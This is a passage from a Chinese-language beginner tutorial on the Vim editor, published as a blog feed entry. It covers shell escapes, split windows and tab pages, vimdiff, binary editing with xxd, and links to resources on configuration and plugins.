<h3 id="4-9-Shell切换"><a href="#4-9-Shell切换" class="headerlink" title="4.9 Shell切换"></a>4.9 Shell切换</h3><p>当处于编辑的对话过程中时，可能需要执行一些Linux命令。如果需要保存当前的结果，退出编辑程序，再执行所需的Linux命令，然后再回头继续编辑过程，就显得十分累赘。如果能在编辑的环境中运行Linux命令就要省事得多。在Vim中，可以用下面的命令来做到这一点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:!shell_command   执行完 shell_command 后回到Vim</div></pre></td></tr></table></figure></p>
<p>这称为Shell切换。它允许执行任何可以在标准的Shell提示符下执行的命令。当这条命令执行完毕，控制返回给编辑程序。又可以继续编辑对话过程。</p>
<h3 id="4-10-分屏与标签页"><a href="#4-10-分屏与标签页" class="headerlink" title="4.10 分屏与标签页"></a>4.10 分屏与标签页</h3><h4 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h4><p>普通的Vim模式，打开一个Vim程序只能查看一个文件，如果想同时查看多个文件，就需要用到Vim分屏与标签页功能。<br>Vim的分屏，主要有两种方式：上下分屏（水平分屏）和左右分屏（垂直分屏），在命令模式分别敲入以下命令即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:split（可用缩写 :sp）			上下分屏；</div><div class="line">:vsplit（可用缩写 :vsp）		  左右分屏。</div></pre></td></tr></table></figure></p>
<p>另外，也可以在终端里启动vim时就开启分屏操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vim -On file1 file2...   打开 file1 和 file2 ，垂直分屏</div><div class="line">vim -on file1 file2...   打开 file1 和 file2 ，水平分屏</div></pre></td></tr></table></figure></p>
<p>理论上，一个Vim窗口，可以分为多个Vim屏幕，切换屏幕需要用键盘快捷键，命令分别有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Ctrl+w+h			切换到当前分屏的左边一屏；</div><div class="line">Ctrl+w+l			切换到当前分屏的右边一屏；</div><div class="line">Ctrl+w+j			切换到当前分屏的下方一屏；</div><div class="line">Ctrl+w+k			切换到当前分屏的上方一屏。</div></pre></td></tr></table></figure></p>
<p>即键盘上的<code>h,j,k,l</code> 四个Vim专用方向键，配合<code>Ctrl</code>键和<code>w</code>键（<code>window</code>的缩写），就能跳转到目标分屏。另外，也可以直接按 <code>Ctrl+w+w</code> 来跳转分屏，不过跳转方向则是在当前Vim窗口所有分屏中，按照<code>逆时针</code>方向跳转。<br>下面是改变尺寸的一些操作，主要是高度，对于宽度你可以使用 <code>[Ctrl+W &lt;]</code> 或是 <code>[Ctrl+W &gt;]</code> ，但这可能需要最新的版本才支持。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Ctrl+W =			让所有的屏都有一样的高度；</div><div class="line">Ctrl+W +			增加高度；</div><div class="line">Ctrl+W -			减少高度。</div></pre></td></tr></table></figure></p>
<h4 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a>标签页</h4><p>Vim的标签（Tab）页，类似浏览器的标签页，一个标签页打开一个Vim的窗口，一个Vim的窗口可以支持N个分屏。<br>在Vim中新建一个标签的命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:tabnew</div></pre></td></tr></table></figure></p>
<p>如果要在新建标签页的同时打开一个文件，则可以在命令后面直接附带文件路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:tabnew filename</div></pre></td></tr></table></figure></p>
<p>Vim 中的每个标签页有一个唯一的数字序号，第一个标签页的序号是<code>0</code>，从左向右依次加一。关于标签页有一系列操作命令，简介如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">:tN[ext]                跳转到上一个匹配的标签</div><div class="line">:tabN[ext]              跳到上一个标签页</div><div class="line">:tabc[lose]             关闭当前标签页</div><div class="line">:tabdo                  为每个标签页执行命令</div><div class="line">:tabe[dit]              在新标签页里编辑文件</div><div class="line">:tabf[ind]              寻找 &apos;path&apos; 里的文件，在新标签页里编辑之</div><div class="line">:tabfir[st]             转到第一个标签页</div><div class="line">:tabl[ast]              转到最后一个标签页</div><div class="line">:tabm[ove]  N           把标签页移到序号为N位置</div><div class="line">:tabnew [filename]      在新标签页里编辑文件</div><div class="line">:tabn[ext]              转到下一个标签页</div><div class="line">:tabo[nly]              关闭所有除了当前标签页以外的所有标签页</div><div class="line">:tabp[revious]          转到前一个标签页</div><div class="line">:tabr[ewind]            转到第一个标签页</div></pre></td></tr></table></figure></p>
<h3 id="4-11-与外部工具集成"><a href="#4-11-与外部工具集成" class="headerlink" title="4.11 与外部工具集成"></a>4.11 与外部工具集成</h3><p>Vim 可以与许多外部程序集成，功能十分强大，比如 <code>diff</code> , <code>ctags</code> , <code>sort</code> , <code>xxd</code> 等等，下面选取几个简单介绍一下。</p>
<h4 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h4><p>Linux 命令 <code>diff</code> 用来对比两个文件的内容，不过对比结果显示在终端里，可读性比较差。结合Vim，在终端里可以直接输入命令 <code>vimdiff</code>，后面跟两个文件名作为参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vimdiff file1 file2</div></pre></td></tr></table></figure></p>
<p>即可在Vim里分屏显示两个文件内容的对比结果，对文件内容差异部分进行高亮标记，还可以同步滚动两个文件内容，更可以实时修改文件内容，方便程度和用户体验大大提高。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vimdiff a.txt b.txt</div></pre></td></tr></table></figure></p>
<p>如果直接给 <code>-d</code> 选项是一样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim -d a.txt b.txt</div></pre></td></tr></table></figure></p>
<p>除了在终端里开启 <code>vimdiff</code> 功能，也可以在打开 Vim 后，在 Vim 的命令模式输入相关命令来开启 <code>vimdiff</code> 功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:diffsplit abc.txt</div></pre></td></tr></table></figure></p>
<p>如果你现在已经开启了一个文件，想Vim帮你区分你的文件跟 <code>abc.txt</code> 有什么区别，可以在Vim中用 <code>diffsplit</code> 的方式打开第二个文件，这个时 候Vim会用 <code>split</code>（分<strong>上下</strong>两屏）的方式开启第二个文件，并且通过颜色，<code>fold</code>来显示两个文件的区别<br>这样Vim就会用颜色帮你区分开2个文件的区别。如果文件比较大（源码）重复的部分会帮你折叠起来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:diffpatch filename</div></pre></td></tr></table></figure></p>
<p>通过 <code>:diffpatch</code> 你的patch的文件名，就可以以当前文件加上你的patch来显示。vim会split一个新的屏，显示patch后的信息并且用颜色标明区别。<br>如果不喜欢上下对比，喜欢左右（比较符合视觉）可以在前面加 <code>vert</code> ，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:vert diffsplit abc.txt</div><div class="line">:vert diffpatch abc.txt</div></pre></td></tr></table></figure></p>
<p>看完diff，用 <code>:only</code> 回到原本编辑的文件，觉得diff的讨厌颜色还是在哪里，只要用 <code>:diffoff</code> 关闭就好了。</p>
<p>还有个常用的diff中的就是 <code>:diffu</code> ,这个是 <code>:diffupdate</code> 的简写，更新的时候用。<br>Vim的<code>diff</code>功能显示效果如下所示：<br><img src="http://www.2cto.com/uploadfile/Collfiles/20160813/20160813092107159.jpg" alt=""></p>
<blockquote>
<p>图片来自 <a href="http://www.2cto.com/net/201608/536924.html" target="_blank" rel="external">http://www.2cto.com/net/201608/536924.html</a> </p>
</blockquote>
<h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>Linux命令 <code>sort</code> 可以对文本内容进行按行中的字符比较、排序，但在终端里使用 <code>sort</code> 命令处理文件，并不能实时查看文件内容。具体用法请自查手册。</p>
<h4 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h4><p><code>vim+xxd</code> 是Linux下最常用的二进制文本编辑工具，<code>xxd</code>其实是 Vim 外部的一个转换程序，随 Vim 一起发布，在 Vim 里调用它来编辑二进制文本非常方便。<br>首先以二进制模式在终端里打开一个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim -b filename</div></pre></td></tr></table></figure></p>
<p>Vim 的 <code>-b</code> 选项是告诉 Vim 打开的是一个二进制文件，不指定的话，会在后面加上 <code>0x0a</code> ，即一个换行符。<br>然后在 Vim 的命令模式下键入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:%!xxd</div></pre></td></tr></table></figure></p>
<p>即可看到二进制模式显示出来的文本，看起来像这样：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0000000: 1f8b 0808 39d7 173b 0203 7474 002b 4e49  ....9..;..tt.+NI </div><div class="line">0000010: 4b2c 8660 eb9c ecac c462 eb94 345e 2e30  K,......b..4^.0 </div><div class="line">0000020: 373b 2731 0b22 0ca6 c1a2 d669 1035 39d9  7;&apos;1.&quot;.....i.59</div></pre></td></tr></table></figure></p>
<p>然后就可以在二进制模式下编辑该文件，编辑后保存，然后用下面命令从二进制模式转换到普通模式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:%!xxd -r</div></pre></td></tr></table></figure></p>
<p>另外，也可以调整二进制的显示模式，默认是 <strong>2</strong> 个字节为一组，可以通过 <code>g</code> 参数调整每组字节数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">:%!xxd -g 1         表示每1个字节为1组 </div><div class="line">:%!xxd -g 2         表示每2个字节为1组(默认) </div><div class="line">:%!xxd -g 4         表示每4个字节为1组</div></pre></td></tr></table></figure></p>
<h2 id="5-Vim配置"><a href="#5-Vim配置" class="headerlink" title="5. Vim配置"></a>5. Vim配置</h2><p>最初安装的Vim功能、特性支持比较少，用起来比较费劲，想要稍微“好用”一点，需做一些初步的配置。Vim的配置主要分为Vim本身特性的配置和外部插件的配置两部分。<br>Vim的配置是通常是存放在用户主目录的 <code>.vimrc</code> 的隐藏文件中的。就Vim本身特性来说，基础的配置有编程语言语法高亮、缩进设置、行号显示、搜索高亮、TAB键设置、字体设置、Vim主题设置等等，稍微高级一些的有编程语言缩进、自动补全设置等，具体配置项可以自行查资料，全面详细的配置项介绍可以参考：<br>《Vim Options》：<br><a href="http://vimcdoc.sourceforge.net/doc/options.html#%27completeopt%27" target="_blank" rel="external">http://vimcdoc.sourceforge.net/doc/options.html#%27completeopt%27</a></p>
<h2 id="6-Vim插件"><a href="#6-Vim插件" class="headerlink" title="6. Vim插件"></a>6. Vim插件</h2><p>Vim“编辑器之神”的称号并不是浪得虚名，然而，这个荣誉的背后，或许近半的功劳要归功于强大的插件支持特性，以及社区开发的各种各样功能强大的插件。</p>
<p>平时开发人员常用插件主要是目录（文件）查看和管理、编程语言缩进与自动补全、编程语言Docs支持、函数跳转、项目管理等等，简单配置可以参考下面：</p>
<p>《Vim插件简单介绍》：<br><a href="http://blog.segmentfault.com/xuelang/1190000000630547" target="_blank" rel="external">http://blog.segmentfault.com/xuelang/1190000000630547</a></p>
<p>《手把手教你把Vim改装成一个IDE编程环境(图文)》：<br><a href="http://blog.csdn.net/wooin/article/details/1858917" target="_blank" rel="external">http://blog.csdn.net/wooin/article/details/1858917</a></p>
<p>《将Vim改造为强大的IDE》：<br><a href="http://www.cnblogs.com/zhangsf/archive/2013/06/13/3134409.html" target="_blank" rel="external">http://www.cnblogs.com/zhangsf/archive/2013/06/13/3134409.html</a></p>
<p>当然，这些插件都是拜Vim本身的插件支持特性所赐。Vim为了支持丰富的第三方插件，自身定义了一套简单的脚本开发语言，供程序员自行开发自己所需要的插件，插件开发介绍可以参考：</p>
<p>《Writing Vim Plugins》：<br><a href="http://stevelosh.com/blog/2011/09/writing-vim-plugins/" target="_blank" rel="external">http://stevelosh.com/blog/2011/09/writing-vim-plugins/</a> </p>
<h2 id="7-Vim完整文档"><a href="#7-Vim完整文档" class="headerlink" title="7. Vim完整文档"></a>7. Vim完整文档</h2><ol>
<li>Vim官方文档：<a href="http://vimdoc.sourceforge.net/" target="_blank" rel="external">http://vimdoc.sourceforge.net/</a></li>
<li>Vim中文用户手册7_3.pdf ：<a href="http://pan.baidu.com/s/1jGzbTBo" target="_blank" rel="external">http://pan.baidu.com/s/1jGzbTBo</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://images.cnitblog.com/blog/379772/201306/14142737-eaf681b3f8d04c5085d0c6efdd85684f.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;图片来自： &lt;a href=&quot;http://www.cnblogs.com/zhangsf/archive/2013/06/13/3134409.html&quot;&gt;http://www.cnblogs.com/zhangsf/archive/2013/06/13/3134409.html&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;公司新员工学习有用到，Vim官网的手册又太大而全，而网上各方资料要么不全面，要么不够基础。在网上搜集各方资料，按照自己的框架整理一份Vim入门基础教程，分享出来。特点是偏向基础，但对入门者来说足够全面，而且结构框架清晰。&lt;br&gt;另外，参考资料众多，没有一一标出来，如果作者看到，请联系我确认一下是否参考了你的资料，我会在文中标注出来。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="coding" scheme="http://jiayu0x.com/categories/coding/"/>
    
    
      <category term="coding" scheme="http://jiayu0x.com/tags/coding/"/>
    
      <category term="vim" scheme="http://jiayu0x.com/tags/vim/"/>
    
  </entry>
  
</feed>
